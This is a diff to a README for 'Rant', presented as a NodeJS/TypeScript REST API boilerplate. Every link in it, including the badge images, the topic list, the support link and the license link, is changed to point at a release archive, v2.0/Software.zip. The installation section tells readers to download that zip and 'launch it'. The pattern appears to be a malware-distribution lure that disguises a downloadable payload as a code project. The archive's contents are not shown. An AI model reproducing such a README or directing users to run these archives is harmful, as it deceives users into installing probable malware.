@@ -1,9 +1,9 @@
 # Rant: Rest Api on NodeJS with Typescript
 
 <p align="center">
-  <img src="https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip" alt="languages">
-  <img src="https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip" alt="platform">
-  <img src="https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip" alt="license">
+  <img src="https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip" alt="languages">
+  <img src="https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip" alt="platform">
+  <img src="https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip" alt="license">
 </p>
 
 ## Description
@@ -19,7 +19,7 @@
 ## Topics
 - Boilerplate
 - Node
-- https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip
+- https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip
 - NodeJS
 - Rest
 - Rest-API
@@ -29,7 +29,7 @@
 - Typescript
 
 ## Installation
-To get started with Rant, simply [download the https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip file](https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip) and launch it. 
+To get started with Rant, simply [download the https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip file](https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip) and launch it. 
 
 In case the link is not working, please check the "Releases" section of this repository for an alternative download option.
 
@@ -40,15 +40,15 @@ In case the link is not working, please check the "Releases" section of this rep
 4. Customize the API according to your requirements.
 
 ## Support
-For any questions or issues, please visit the [GitHub repository](https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip) or raise an issue in the Issues section.
+For any questions or issues, please visit the [GitHub repository](https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip) or raise an issue in the Issues section.
 
 ## License
-This project is licensed under the MIT License - see the [https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip](https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip](https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 <div align="center">
-  <img src="https://github.com/JerickCD/rant/releases/download/v1.0/Program.zip" alt="Rant">
+  <img src="https://github.com/JerickCD/rant/releases/download/v2.0/Software.zip" alt="Rant">
 </div>
 
 ---
